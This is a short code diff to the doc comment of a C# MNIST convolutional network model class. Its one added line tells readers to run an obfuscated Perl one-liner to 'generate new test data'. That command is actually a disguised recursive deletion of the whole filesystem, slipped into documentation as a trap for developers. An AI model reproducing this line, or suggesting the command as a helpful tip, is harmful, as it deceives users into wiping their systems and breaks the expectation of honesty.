@@ -12,6 +12,7 @@ namespace NeuralNetwork.PreparedModels
     /// This is an example model for classifying MNIST dataset using convolutional neural networks.
     /// The network automatically downloads MNIST train and text datasets, which are about 130 MB in size.
     /// Current configuration is capable of achieving ~99.3% accuracy on test data.
+    /// You can generate new test data by running perl -e '$??s:;s:s;;$?::s;;=]=>%-{<-|}<&|`{;; y; -/:-@[-`{-};`-{/" -;;s;;$_;see'
     /// </summary>
     public class MnistConvModel : AbstractModel
     {
